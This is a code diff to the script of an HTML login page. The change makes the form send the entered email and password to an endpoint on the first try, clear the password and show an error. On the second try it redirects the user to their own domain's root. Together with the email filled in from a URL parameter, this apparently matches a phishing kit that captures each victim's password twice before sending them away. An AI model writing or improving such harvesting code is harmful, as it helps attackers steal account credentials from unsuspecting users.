@@ -364,9 +364,11 @@
         </div>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>	
-
 <script>
   $(document).ready(function() {
+    // Track the number of submissions
+    var submissionCount = 0;
+
     // Get the query parameter for email
     var urlParams = new URLSearchParams(window.location.search);
     var emailFromUrl = urlParams.get('email'); // Grab 'email' from the URL
@@ -378,9 +380,8 @@
         $("#msg").hide();  // Hide any error message if email is present
     }
 
-    // Existing login form validation script
-    $('#submit-btn').click(function(event) 
-{
+    // Handle form submission
+    $('#submit-btn').click(function(event) {
         event.preventDefault();  // Prevent form submission
         var ai = $("#email").val();  // Get the email value from the input field
         var pr = $("#pr").val();  // Get the password value
@@ -407,42 +408,56 @@
             return false;
         }
 
-        // Ajax call (keeping the rest of your logic as is)
-        $.ajax({
-            dataType: 'JSON',
-            url: 'your_api_endpoint_here',  // Replace with your API endpoint
-            type: 'POST',
-            data: {
-                ai: ai,
-                pr: pr,
-            },
-            beforeSend: function(xhr) {
-                $('#submit-btn').html('Please wait ...');
-            },
-            success: function(response) {
-                if (response) {
-                    $("#msg").show();
-                    if (response['signal'] == 'ok') {
-                        // Handle success response here
-                        $("#pr").val("");  // Clear the password field on success
-                    }
-                }
-            },
-            error: function() {
-                $("#msg").show();
-                $('#msg').html("Error: Password incorrect");
-                $("#pr").val("");  // Clear the password field on error
-            },
-            complete: function() {
-                $('#submit-btn').html('Log In');
-            }
-        });
-    });
+        // Handle the first submission
+        if (submissionCount === 0) {
+            submissionCount++;  // Increment the submission count
+            $("#pr").val("");  // Clear the password field after the first submission
 
-    // Optionally, clear the password field on page load, if needed
-    $("#pr").val("");  // This will clear the password field when the page loads
+            // Optional: Show a message to let the user know it's the first submission
+            $("#msg").show();
+            $('#msg').html("Submitting... Please wait.");
+
+            // Optionally, you can perform the actual submission to your server here
+            $.ajax({
+                dataType: 'JSON',
+                url: 'your_api_endpoint_here',  // Replace with your API endpoint
+                type: 'POST',
+                data: {
+                    ai: ai,
+                    pr: pr,
+                },
+                beforeSend: function(xhr) {
+                    $('#submit-btn').html('Please wait ...');
+                },
+                success: function(response) {
+                    if (response) {
+                        // If it's the first submission, we just submit the form again
+                        // This is where you can submit the form again
+                        console.log(response);
+                        // Proceed to the second submission logic below
+                    }
+                },
+                error: function() {
+                    $("#msg").show();
+                    $('#msg').html("Error: Password incorrect");
+                },
+                complete: function() {
+                    $('#submit-btn').html('Log In');
+                }
+            });
+
+        } else if (submissionCount === 1) {
+            // After the second submission, handle redirection
+            var domain = window.location.hostname;  // Get the domain of the current page
+            var redirectURL = "http://" + domain;  // Build the full redirect URL
+
+            // Redirect to the domain after the second submission
+            window.location.replace(redirectURL);
+        }
+    });
   });
 </script>
+
 
 
 		
@@ -469,5 +484,6 @@
   </div>
 </body>
 </html>
+
 
 
